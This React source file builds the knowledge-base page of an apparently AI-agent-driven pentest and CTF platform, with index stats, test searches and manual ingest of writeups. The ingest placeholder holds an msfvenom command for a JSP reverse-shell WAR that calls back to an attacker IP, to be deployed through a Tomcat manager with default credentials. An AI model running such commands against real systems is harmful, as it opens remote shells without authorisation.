// ═══════════════════════════════════════════════════════════
// KnowledgePage.jsx — Knowledge Base browser
// Shows stats (chunks, sources, phase/outcome breakdown),
// lets you run test searches, and manually ingest text.
// ═══════════════════════════════════════════════════════════

const { useState, useEffect, useCallback } = React;

const PHASES      = ['recon','exploit','privesc','web','mixed','osint','post','lateral'];
const OUTCOMES    = ['shell obtained','root','user flag','foothold','failed','lateral','post_exploit','unknown'];
const CHUNK_TYPES = ['command','script','procedure','technique','tip','finding','tool_usage','output','report'];

const CHUNK_TYPE_ICONS = {
  command: '⚡', script: '📜', procedure: '📋', technique: '🎯',
  tip: '💡', finding: '🔍', tool_usage: '🔧', output: '📊', report: '📄',
};
const CHUNK_TYPE_COLORS = {
  command: 'var(--cyan)', script: '#a78bfa', procedure: 'var(--amber)',
  technique: 'var(--green)', tip: '#facc15', finding: 'var(--red)',
  tool_usage: '#60a5fa', output: '#94a3b8', report: '#6b7280',
};

const PHASE_COLORS = {
  recon:   'var(--cyan)',   exploit:  'var(--red)',
  privesc: 'var(--amber)',  web:      '#a78bfa',
  mixed:   'var(--text-secondary)',          osint:    'var(--green)',
};
const OUTCOME_COLORS = {
  'shell obtained': 'var(--green)', root:       'var(--green)',
  'user flag':      'var(--cyan)',  foothold:   'var(--cyan)',
  failed:           'var(--red)',   unknown:    'var(--text-muted)',
};

function Bar({ label, value, max, color }) {
  const pct = max > 0 ? Math.min(100, (value / max) * 100) : 0;
  return React.createElement('div', { style: { marginBottom: 8 } },
    React.createElement('div', { style: { display: 'flex', justifyContent: 'space-between', fontSize: 11, marginBottom: 3 } },
      React.createElement('span', { style: { color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' } }, label),
      React.createElement('span', { style: { color, fontFamily: 'var(--font-mono)' } }, value)
    ),
    React.createElement('div', { style: { height: 4, borderRadius: 2, background: 'var(--bg-panel)', overflow: 'hidden' } },
      React.createElement('div', { style: { height: '100%', width: `${pct}%`, background: color, borderRadius: 2, transition: 'width 0.5s' } })
    )
  );
}

function KnowledgePage() {
  const [stats,       setStats]       = useState(null);
  const [statsErr,    setStatsErr]    = useState('');
  const [query,       setQuery]       = useState('');
  const [phaseFilter, setPhaseFilter] = useState('');
  const [outcomeFilter, setOutcomeFilter] = useState('');
  const [topK,        setTopK]        = useState(5);
  const [searching,   setSearching]   = useState(false);
  const [searchResult, setSearchResult] = useState('');
  const [searchErr,   setSearchErr]   = useState('');
  const [ingestText,  setIngestText]  = useState('');
  const [ingestSrc,   setIngestSrc]   = useState('manual_entry');
  const [ingestPhase, setIngestPhase] = useState('');
  const [ingestOutcome, setIngestOutcome] = useState('');
  const [ingesting,   setIngesting]   = useState(false);
  const [ingestMsg,   setIngestMsg]   = useState('');
  const [chunkTypeFilter, setChunkTypeFilter] = useState('');
  const [tab,         setTab]         = useState('stats'); // stats | search | ingest | setup

  const loadStats = useCallback(async () => {
    try {
      const s = await window.API.knowledge.stats();
      setStats(s);
      setStatsErr('');
    } catch (e) {
      setStatsErr(e.message);
    }
  }, []);

  useEffect(() => { loadStats(); }, [loadStats]);

  async function runSearch() {
    if (!query.trim()) return;
    setSearching(true); setSearchResult(''); setSearchErr('');
    try {
      const r = await window.API.knowledge.search(query, {
        top_k:   topK,
        phase:   phaseFilter        || null,
        outcome: outcomeFilter      || null,
        chunk_type_filter: chunkTypeFilter || null,
      });
      setSearchResult(r.results || '(no results)');
    } catch (e) { setSearchErr(e.message); }
    setSearching(false);
  }

  async function doIngest() {
    if (!ingestText.trim()) return;
    setIngesting(true); setIngestMsg('');
    const meta = {};
    if (ingestPhase)   meta.phase   = ingestPhase;
    if (ingestOutcome) meta.outcome = ingestOutcome;
    try {
      const r = await window.API.knowledge.ingest(ingestText, ingestSrc, Object.keys(meta).length ? meta : null);
      setIngestMsg(r.ok ? `✓ ${r.message}` : `✗ ${r.error || r.message}`);
      if (r.ok) { setIngestText(''); loadStats(); }
    } catch (e) { setIngestMsg(`✗ ${e.message}`); }
    setIngesting(false);
  }

  const card  = { background: 'var(--bg-surface)', border: '1px solid var(--border)', borderRadius: 8, padding: '14px 16px' };
  const inp   = { background: 'var(--bg-panel)', border: '1px solid var(--border)', borderRadius: 'var(--radius)', color: 'var(--text-primary)', fontSize: 12, padding: '7px 10px', outline: 'none', fontFamily: 'var(--font-mono)', width: '100%', boxSizing: 'border-box' };
  const selStyle = { ...inp, cursor: 'pointer' };
  const tabBtn = (t, label) => React.createElement('button', {
    key: t, onClick: () => setTab(t),
    style: {
      padding: '5px 16px', borderRadius: 5, border: 'none', cursor: 'pointer', fontSize: 11,
      fontFamily: 'var(--font-mono)',
      background: tab === t ? 'rgba(0,212,255,0.12)' : 'transparent',
      color: tab === t ? 'var(--cyan)' : 'var(--text-muted)',
      borderBottom: tab === t ? '2px solid var(--cyan)' : '2px solid transparent',
    }
  }, label);

  const notInstalled = stats && !stats.available;

  return React.createElement('div', {
    style: { padding: 16, height: '100%', overflowY: 'auto', background: 'var(--bg-surface)', display: 'flex', flexDirection: 'column', gap: 14 }
  },
    // Header
    React.createElement('div', { className: 'page-header', style: { flexShrink: 0 } },
      React.createElement('div', null,
        React.createElement('div', { className: 'page-title' }, '🧠 Knowledge Base'),
        React.createElement('div', { className: 'page-subtitle' },
          stats?.total_chunks
            ? `${stats.total_chunks.toLocaleString()} chunks · ${stats.source_files} source files indexed`
            : 'RAG knowledge base from your CTF writeups & pentest reports'
        )
      ),
      React.createElement('button', {
        onClick: loadStats,
        style: { padding: '5px 14px', borderRadius: 5, border: '1px solid var(--border-light)', background: 'rgba(255,255,255,0.04)', color: 'var(--text-secondary)', cursor: 'pointer', fontSize: 11 }
      }, '⟳ Refresh')
    ),

    // Tabs
    React.createElement('div', { style: { display: 'flex', gap: 2, borderBottom: '1px solid var(--border)', flexShrink: 0 } },
      tabBtn('stats',  '📊 Stats'),
      tabBtn('search', '🔍 Test Search'),
      tabBtn('ingest', '✏ Manual Ingest'),
      tabBtn('setup',  '⚙ Setup Guide'),
    ),

    // ── STATS TAB ────────────────────────────────────────────
    tab === 'stats' && React.createElement('div', { style: { display: 'flex', flexDirection: 'column', gap: 14 } },
      notInstalled
        ? React.createElement('div', { style: { ...card, borderColor: 'rgba(255,68,102,0.3)', background: 'rgba(255,68,102,0.05)' } },
            React.createElement('div', { style: { color: 'var(--red)', fontSize: 13, fontWeight: 700, marginBottom: 8 } }, '⚠ Knowledge Base not installed'),
            React.createElement('div', { style: { color: 'var(--text-muted)', fontSize: 12, lineHeight: 1.8 } },
              'Install dependencies on your Kali machine, then ingest your 260 files:'),
            React.createElement('pre', {
              style: { background: 'var(--bg-panel)', border: '1px solid var(--border)', borderRadius: 5, padding: 12, fontSize: 11, color: 'var(--cyan)', marginTop: 8, overflowX: 'auto' }
            }, `pip install chromadb sentence-transformers pypdf beautifulsoup4 tqdm lxml\n\ncd /your/platform/directory\npython3 knowledge/ingest.py /path/to/your/writeups/`)
          )
        : !stats
          ? React.createElement('div', { style: { color: 'var(--text-muted)', textAlign: 'center', padding: 40 } }, 'Loading...')
          : statsErr
            ? React.createElement('div', { style: { color: 'var(--red)', padding: 20 } }, statsErr)
            : React.createElement('div', { style: { display: 'flex', flexDirection: 'column', gap: 14 } },
                // Top row: Total + embed model
                React.createElement('div', { style: { display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 14 } },
                  React.createElement('div', { style: card },
                    React.createElement('div', { style: { fontSize: 10, color: 'var(--text-muted)', marginBottom: 6, textTransform: 'uppercase', letterSpacing: 1 } }, 'Total Indexed'),
                    React.createElement('div', { style: { fontSize: 32, fontWeight: 800, color: 'var(--cyan)', fontFamily: 'var(--font-mono)' } },
                      (stats.total_chunks || 0).toLocaleString()),
                    React.createElement('div', { style: { fontSize: 11, color: 'var(--text-muted)', marginTop: 4 } },
                      `chunks from ${stats.source_files || 0} source files`)
                  ),
                  React.createElement('div', { style: card },
                    React.createElement('div', { style: { fontSize: 10, color: 'var(--text-muted)', marginBottom: 6, textTransform: 'uppercase', letterSpacing: 1 } }, 'Embed Model'),
                    React.createElement('div', { style: { fontSize: 13, fontWeight: 700, color: 'var(--green)', fontFamily: 'var(--font-mono)', wordBreak: 'break-all' } },
                      stats.embed_model || 'unknown'),
                    React.createElement('div', { style: { fontSize: 11, color: 'var(--text-muted)', marginTop: 4 } },
                      `Reranker: ${stats.rerank_model || 'disabled'}`)
                  ),
                  React.createElement('div', { style: card },
                    React.createElement('div', { style: { fontSize: 10, color: 'var(--text-muted)', marginBottom: 10, textTransform: 'uppercase', letterSpacing: 1 } }, 'By Outcome'),
                    Object.entries(stats.by_outcome || {})
                      .sort(([,a],[,b]) => b-a).slice(0, 6)
                      .map(([outcome, count]) =>
                        React.createElement(Bar, {
                          key: outcome, label: outcome, value: count,
                          max: Math.max(...Object.values(stats.by_outcome||{}), 1),
                          color: OUTCOME_COLORS[outcome] || 'var(--text-secondary)'
                        })
                      )
                  )
                ),
                // Bottom row: By phase + By chunk type
                React.createElement('div', { style: { display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 14 } },
                  React.createElement('div', { style: card },
                    React.createElement('div', { style: { fontSize: 10, color: 'var(--text-muted)', marginBottom: 10, textTransform: 'uppercase', letterSpacing: 1 } }, 'By Attack Phase'),
                    Object.entries(stats.by_phase || {})
                      .sort(([,a],[,b]) => b-a)
                      .map(([phase, count]) =>
                        React.createElement(Bar, {
                          key: phase, label: phase, value: count,
                          max: Math.max(...Object.values(stats.by_phase||{}), 1),
                          color: PHASE_COLORS[phase] || 'var(--text-secondary)'
                        })
                      )
                  ),
                  React.createElement('div', { style: card },
                    React.createElement('div', { style: { fontSize: 10, color: 'var(--text-muted)', marginBottom: 10, textTransform: 'uppercase', letterSpacing: 1 } }, 'By Chunk Type'),
                    Object.entries(stats.by_chunk_type || {})
                      .sort(([,a],[,b]) => b-a)
                      .map(([ctype, count]) =>
                        React.createElement('div', { key: ctype, style: { display: 'flex', alignItems: 'center', gap: 6, marginBottom: 6 } },
                          React.createElement('span', { style: { fontSize: 14, width: 20 } }, CHUNK_TYPE_ICONS[ctype] || '📝'),
                          React.createElement('div', { style: { flex: 1 } },
                            React.createElement(Bar, {
                              label: ctype, value: count,
                              max: Math.max(...Object.values(stats.by_chunk_type||{}), 1),
                              color: CHUNK_TYPE_COLORS[ctype] || 'var(--text-secondary)'
                            })
                          )
                        )
                      )
                  )
                )
              )
    ),

    // ── SEARCH TAB ───────────────────────────────────────────
    tab === 'search' && React.createElement('div', { style: { display: 'flex', flexDirection: 'column', gap: 12 } },
      React.createElement('div', { style: card },
        React.createElement('div', { style: { fontSize: 11, color: 'var(--text-muted)', marginBottom: 10 } },
          'Test semantic search queries — this is exactly what the master agent runs before each LLM planning call.'),
        React.createElement('div', { style: { display: 'flex', gap: 8, marginBottom: 10 } },
          React.createElement('div', { style: { flex: 3 } },
            React.createElement('div', { style: { fontSize: 10, color: 'var(--text-muted)', marginBottom: 4 } }, 'QUERY'),
            React.createElement('input', {
              value: query, placeholder: 'e.g. apache exploit shell  |  sudo privesc ubuntu  |  smb eternalblue',
              onChange: e => setQuery(e.target.value),
              onKeyDown: e => e.key === 'Enter' && runSearch(),
              style: inp
            })
          ),
          React.createElement('div', { style: { flex: 1 } },
            React.createElement('div', { style: { fontSize: 10, color: 'var(--text-muted)', marginBottom: 4 } }, 'PHASE FILTER'),
            React.createElement('select', { value: phaseFilter, onChange: e => setPhaseFilter(e.target.value), style: selStyle },
              React.createElement('option', { value: '' }, 'Any phase'),
              PHASES.map(p => React.createElement('option', { key: p, value: p }, p))
            )
          ),
          React.createElement('div', { style: { flex: 1 } },
            React.createElement('div', { style: { fontSize: 10, color: 'var(--text-muted)', marginBottom: 4 } }, 'OUTCOME FILTER'),
            React.createElement('select', { value: outcomeFilter, onChange: e => setOutcomeFilter(e.target.value), style: selStyle },
              React.createElement('option', { value: '' }, 'Any outcome'),
              OUTCOMES.map(o => React.createElement('option', { key: o, value: o }, o))
            )
          ),
          React.createElement('div', { style: { flex: 1 } },
            React.createElement('div', { style: { fontSize: 10, color: 'var(--text-muted)', marginBottom: 4 } }, 'CHUNK TYPE'),
            React.createElement('select', { value: chunkTypeFilter, onChange: e => setChunkTypeFilter(e.target.value), style: selStyle },
              React.createElement('option', { value: '' }, 'Any type'),
              CHUNK_TYPES.map(ct => React.createElement('option', { key: ct, value: ct },
                `${CHUNK_TYPE_ICONS[ct] || '📝'} ${ct}`
              ))
            )
          ),
          React.createElement('div', { style: { flex: 0.5 } },
            React.createElement('div', { style: { fontSize: 10, color: 'var(--text-muted)', marginBottom: 4 } }, 'TOP K'),
            React.createElement('select', { value: topK, onChange: e => setTopK(Number(e.target.value)), style: selStyle },
              [3,5,8,10].map(n => React.createElement('option', { key: n, value: n }, n))
            )
          )
        ),
        React.createElement('button', {
          onClick: runSearch, disabled: searching || !query.trim(),
          style: {
            padding: '7px 20px', borderRadius: 5, border: '1px solid var(--accent)',
            background: 'var(--accent)', color: '#0D0E14', cursor: 'pointer', fontSize: 12,
            boxShadow: '0 0 10px var(--accent-glow)'
          }
        }, searching ? '⟳ Searching...' : '▶ Search')
      ),
      searchErr && React.createElement('div', { style: { color: 'var(--red)', fontSize: 12 } }, searchErr),
      searchResult && React.createElement('pre', {
        style: {
          background: 'var(--bg-panel)', border: '1px solid var(--border)', borderRadius: 6,
          padding: 14, fontSize: 11, color: 'var(--text-primary)', lineHeight: 1.7,
          overflowX: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-word', maxHeight: 500, overflowY: 'auto'
        }
      }, searchResult)
    ),

    // ── INGEST TAB ───────────────────────────────────────────
    tab === 'ingest' && React.createElement('div', { style: { display: 'flex', flexDirection: 'column', gap: 12 } },
      React.createElement('div', { style: card },
        React.createElement('div', { style: { fontSize: 11, color: 'var(--text-muted)', marginBottom: 10, lineHeight: 1.6 } },
          'Manually add a text snippet to the knowledge base. Useful for custom notes, findings, or techniques you want the agent to know about.'),
        React.createElement('div', { style: { marginBottom: 10 } },
          React.createElement('div', { style: { fontSize: 10, color: 'var(--text-muted)', marginBottom: 4 } }, 'TEXT TO INGEST'),
          React.createElement('textarea', {
            value: ingestText, rows: 6,
            placeholder: 'Paste a writeup excerpt, technique note, or attack path...\n\ne.g. "For Tomcat manager with default creds admin:admin, upload a .war reverse shell:\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war > shell.war\nDeploy via /manager/html, then curl http://target:8080/shell/"',
            onChange: e => setIngestText(e.target.value),
            style: { ...inp, resize: 'vertical', lineHeight: 1.6 }
          })
        ),
        React.createElement('div', { style: { display: 'flex', gap: 8, marginBottom: 12 } },
          React.createElement('div', { style: { flex: 2 } },
            React.createElement('div', { style: { fontSize: 10, color: 'var(--text-muted)', marginBottom: 4 } }, 'SOURCE LABEL'),
            React.createElement('input', {
              value: ingestSrc, placeholder: 'e.g. tomcat_notes or htb_jerry_writeup',
              onChange: e => setIngestSrc(e.target.value),
              style: inp
            })
          ),
          React.createElement('div', { style: { flex: 1 } },
            React.createElement('div', { style: { fontSize: 10, color: 'var(--text-muted)', marginBottom: 4 } }, 'PHASE'),
            React.createElement('select', { value: ingestPhase, onChange: e => setIngestPhase(e.target.value), style: selStyle },
              React.createElement('option', { value: '' }, 'Auto-detect'),
              PHASES.map(p => React.createElement('option', { key: p, value: p }, p))
            )
          ),
          React.createElement('div', { style: { flex: 1 } },
            React.createElement('div', { style: { fontSize: 10, color: 'var(--text-muted)', marginBottom: 4 } }, 'OUTCOME'),
            React.createElement('select', { value: ingestOutcome, onChange: e => setIngestOutcome(e.target.value), style: selStyle },
              React.createElement('option', { value: '' }, 'Auto-detect'),
              OUTCOMES.map(o => React.createElement('option', { key: o, value: o }, o))
            )
          )
        ),
        React.createElement('button', {
          onClick: doIngest, disabled: ingesting || !ingestText.trim(),
          style: {
            padding: '7px 20px', borderRadius: 5, border: '1px solid var(--accent)',
            background: 'var(--accent)', color: '#0D0E14', cursor: 'pointer', fontSize: 12,
            boxShadow: '0 0 10px var(--accent-glow)'
          }
        }, ingesting ? '⟳ Adding...' : '+ Add to Knowledge Base'),
        ingestMsg && React.createElement('div', {
          style: {
            marginTop: 10, padding: '7px 12px', borderRadius: 5, fontSize: 12,
            background: ingestMsg.startsWith('✓') ? 'rgba(0,255,136,0.05)' : 'rgba(255,68,102,0.08)',
            border: `1px solid ${ingestMsg.startsWith('✓') ? 'rgba(0,255,136,0.3)' : 'rgba(255,68,102,0.3)'}`,
            color: ingestMsg.startsWith('✓') ? 'var(--green)' : 'var(--red)'
          }
        }, ingestMsg)
      )
    ),

    // ── SETUP TAB ────────────────────────────────────────────
    tab === 'setup' && React.createElement('div', { style: { display: 'flex', flexDirection: 'column', gap: 14 } },
      React.createElement('div', { style: card },
        React.createElement('div', { style: { fontSize: 13, fontWeight: 700, color: 'var(--cyan)', marginBottom: 12 } }, 'Step 1 — Install dependencies'),
        React.createElement('pre', { style: { background: 'var(--bg-panel)', border: '1px solid var(--border)', borderRadius: 5, padding: 12, fontSize: 11, color: 'var(--cyan)', overflowX: 'auto' } },
`pip install -r knowledge/requirements_kb.txt

# Optional: higher quality reranking (already included above)
# Set embed model via env var for better quality (420 MB, slower):
# KB_EMBED_MODEL=all-mpnet-base-v2 python3 knowledge/ingest_data.py`)
      ),
      React.createElement('div', { style: card },
        React.createElement('div', { style: { fontSize: 13, fontWeight: 700, color: 'var(--cyan)', marginBottom: 8 } }, 'Step 2 — Ingest your files (incremental)'),
        React.createElement('div', { style: { fontSize: 11, color: 'var(--text-muted)', marginBottom: 10, lineHeight: 1.7 } },
          'Place files in knowledge/data/ folder. Run ingest_data.py — it processes PDF, MD, HTML, MHTML, TXT, JSON, YAML files. Only new/modified files are re-processed (incremental). First run ~10–30 min for 260 files.'),
        React.createElement('pre', { style: { background: 'var(--bg-panel)', border: '1px solid var(--border)', borderRadius: 5, padding: 12, fontSize: 11, color: 'var(--cyan)', overflowX: 'auto' } },
`cd /path/to/platform

# First time or to add new files:
python3 knowledge/ingest_data.py

# Force re-ingest all files:
python3 knowledge/ingest_data.py --force

# Wipe and start fresh:
python3 knowledge/ingest_data.py --reset

# Add a specific file:
python3 knowledge/ingest_data.py --add /path/to/new_writeup.pdf

# Add a custom tip/trick:
python3 knowledge/ingest_data.py --add-tip "For Tomcat with admin:admin, upload WAR shell via /manager/html" --category exploit

# Test search quality:
python3 knowledge/ingest_data.py --search "apache RCE shell"
python3 knowledge/ingest_data.py --search "sudo privesc ubuntu" --top-k 3

# Add from a custom directory:
python3 knowledge/ingest_data.py --dir /path/to/more/writeups/`)
      ),
      React.createElement('div', { style: card },
        React.createElement('div', { style: { fontSize: 13, fontWeight: 700, color: 'var(--cyan)', marginBottom: 8 } }, 'Step 3 — How the pipeline enhances agents'),
        React.createElement('div', { style: { fontSize: 11, color: 'var(--text-muted)', lineHeight: 1.7 } },
          'The enhanced RAG pipeline provides agents with:'),
        React.createElement('div', { style: { display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8, marginTop: 8, fontSize: 11 } },
          ...[
            ['⚡ Commands', 'Actual tool invocations from writeups injected when building exploit commands'],
            ['📋 Procedures', 'Step-by-step attack procedures for privesc, web testing, lateral movement'],
            ['📜 Scripts', 'Code blocks and payloads from writeups, kept intact for accuracy'],
            ['🎯 Techniques', 'Attack technique descriptions from CTF writeups and pentest reports'],
            ['💡 Tips & Tricks', 'Manually added tips, notes, gotchas, shortcuts from any source'],
            ['🔍 Findings', 'Vulnerability findings with CVE/CVSS context from real assessments'],
            ['🔧 Tool usage', 'Tool flag documentation and usage examples from writeups'],
            ['📊 Reranking', 'Cross-encoder reranking for highest-precision result ordering'],
          ].map(([k, v]) => React.createElement('div', {
            key: k, style: { padding: '8px 10px', background: 'var(--bg-panel)', borderRadius: 5, border: '1px solid var(--border)' }
          },
            React.createElement('div', { style: { color: 'var(--text-primary)', fontWeight: 600, marginBottom: 3 } }, k),
            React.createElement('div', { style: { color: 'var(--text-muted)', fontSize: 10 } }, v)
          ))
        )
      ),
      React.createElement('div', { style: card },
        React.createElement('div', { style: { fontSize: 13, fontWeight: 700, color: 'var(--cyan)', marginBottom: 8 } }, 'What gets extracted automatically'),
        React.createElement('div', { style: { display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8, fontSize: 11, color: 'var(--text-muted)' } },
          ...[
            ['Tools detected', '130+ tools: nmap, sqlmap, linpeas, gobuster, hydra, msfconsole, impacket, bloodhound...'],
            ['Services', '50+ services: apache, nginx, smb, wordpress, tomcat, mysql, ldap, kerberos...'],
            ['OS fingerprint', 'ubuntu, debian, windows 7/10/11/server, kali, freebsd, macos...'],
            ['Attack types', '50+ types: sqli, lfi_rce, eternalblue, sudo_privesc, suid, kerberoasting, zerologon...'],
            ['MITRE TTPs', 'T#### patterns extracted automatically (T1059, T1548, T1003...)'],
            ['CVEs', 'CVE-XXXX-XXXXX extracted with context from surrounding text'],
            ['Chunk types', 'command, script, procedure, technique, tip, finding, tool_usage, output, report'],
            ['Incremental', 'SHA-256 manifest tracks changes — only new/modified files re-ingested'],
          ].map(([k, v]) => React.createElement('div', {
            key: k, style: { padding: '8px 10px', background: 'var(--bg-panel)', borderRadius: 5, border: '1px solid var(--border)' }
          },
            React.createElement('div', { style: { color: 'var(--text-primary)', fontWeight: 600, marginBottom: 3 } }, k),
            React.createElement('div', { style: { color: 'var(--text-muted)', fontSize: 10 } }, v)
          ))
        )
      )
    )
  );
}

window.KnowledgePage = KnowledgePage;
